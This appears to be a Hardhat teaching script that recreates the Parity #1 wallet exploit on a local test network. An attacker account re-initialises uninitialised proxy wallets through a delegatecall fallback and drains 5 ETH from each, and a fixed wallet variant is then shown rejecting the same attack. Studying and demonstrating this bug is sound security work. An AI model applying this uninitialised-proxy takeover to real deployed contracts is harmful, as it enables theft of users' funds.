const { ethers } = require("hardhat");
const { openLog, fmtEth } = require("./lib");

async function main() {
  const log = openLog("parity1_attack.log");
  log.write("=== Week 12 Part 2: Parity #1 Unauthorized Initialization ===");
  log.write("Network: hardhatMainnet (local Hardhat in-memory)");
  log.write("");

  const [deployer, ownerA, ownerB, ownerC, attacker] = await ethers.getSigners();

  // Deploy vulnerable library
  const Lib = await ethers.getContractFactory("WalletLibraryVulnerable");
  const lib = await Lib.deploy();
  await lib.waitForDeployment();
  log.write("Deployed WalletLibraryVulnerable: " + (await lib.getAddress()));

  // Deploy three proxy wallets pointing at the same library, each funded
  const Wallet = await ethers.getContractFactory("WalletVulnerable");
  const w1 = await Wallet.deploy(await lib.getAddress(), { value: ethers.parseEther("5") });
  const w2 = await Wallet.deploy(await lib.getAddress(), { value: ethers.parseEther("5") });
  const w3 = await Wallet.deploy(await lib.getAddress(), { value: ethers.parseEther("5") });
  await w1.waitForDeployment();
  await w2.waitForDeployment();
  await w3.waitForDeployment();
  log.write("Deployed Wallet 1 (funded 5 ETH): " + (await w1.getAddress()));
  log.write("Deployed Wallet 2 (funded 5 ETH): " + (await w2.getAddress()));
  log.write("Deployed Wallet 3 (funded 5 ETH): " + (await w3.getAddress()));
  log.write("");

  // Only Wallet 1 gets legitimately initialized
  const libIface = new ethers.Interface([
    "function initWallet(address[] _owners, uint256 _required)",
    "function execute(address to, uint256 value)",
  ]);

  const initCallW1 = libIface.encodeFunctionData("initWallet", [[ownerA.address], 1]);
  await ownerA.sendTransaction({ to: await w1.getAddress(), data: initCallW1 });
  log.write("Wallet 1 initialized by legitimate owner: " + ownerA.address);
  log.write("Wallet 2 / Wallet 3: left uninitialized");
  log.write("");

  // Attacker re-initializes Wallet 2 and Wallet 3
  log.write("--- Attacker calls initWallet([attacker], 1) on uninitialized proxies ---");
  const initCallAtk = libIface.encodeFunctionData("initWallet", [[attacker.address], 1]);
  await attacker.sendTransaction({ to: await w2.getAddress(), data: initCallAtk });
  await attacker.sendTransaction({ to: await w3.getAddress(), data: initCallAtk });
  log.write("Wallet 2 owner overwritten via delegatecall fallback");
  log.write("Wallet 3 owner overwritten via delegatecall fallback");
  log.write("");

  // Drain via execute()
  const drainW2 = libIface.encodeFunctionData("execute", [attacker.address, ethers.parseEther("5")]);
  const drainW3 = libIface.encodeFunctionData("execute", [attacker.address, ethers.parseEther("5")]);
  await attacker.sendTransaction({ to: await w2.getAddress(), data: drainW2 });
  await attacker.sendTransaction({ to: await w3.getAddress(), data: drainW3 });

  const w2bal = await ethers.provider.getBalance(await w2.getAddress());
  const w3bal = await ethers.provider.getBalance(await w3.getAddress());
  log.write("Wallet 2 balance after drain: " + fmtEth(ethers, w2bal));
  log.write("Wallet 3 balance after drain: " + fmtEth(ethers, w3bal));
  log.write("");

  // Attacker tries Wallet 1 - should fail because ownerA is owner
  log.write("--- Attacker attempts execute() on Wallet 1 (owned by legit owner) ---");
  try {
    await attacker.sendTransaction({
      to: await w1.getAddress(),
      data: libIface.encodeFunctionData("execute", [attacker.address, ethers.parseEther("1")]),
    });
    log.write("UNEXPECTED: Wallet 1 drain succeeded");
  } catch (e) {
    log.write("Wallet 1 drain reverted as expected: " + (e.shortMessage || "revert"));
  }
  log.write("");

  // Fixed wallet section
  log.write("--- Fixed wallet variant ---");
  const Fixed = await ethers.getContractFactory("WalletFixed");
  const wf = await Fixed.deploy(
    await lib.getAddress(),
    [ownerA.address],
    1,
    { value: ethers.parseEther("5") }
  );
  await wf.waitForDeployment();
  log.write("Deployed WalletFixed (funded 5 ETH): " + (await wf.getAddress()));
  log.write("Owner set in constructor: " + ownerA.address);

  try {
    await wf.connect(attacker).initWallet([attacker.address], 1);
    log.write("UNEXPECTED: re-init succeeded on fixed wallet");
  } catch (e) {
    log.write("Re-init on fixed wallet reverted: " + (e.shortMessage || "revert"));
  }
  try {
    await wf.connect(attacker).execute(attacker.address, ethers.parseEther("1"));
    log.write("UNEXPECTED: execute() succeeded on fixed wallet from attacker");
  } catch (e) {
    log.write("Execute() by attacker reverted on fixed wallet: " + (e.shortMessage || "revert"));
  }
  log.write("WalletFixed balance preserved: " + fmtEth(ethers, await ethers.provider.getBalance(await wf.getAddress())));
  log.write("");

  log.write("RESULT: Uninitialized vulnerable wallets drained. Fixed wallet protected.");
  await log.close();
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
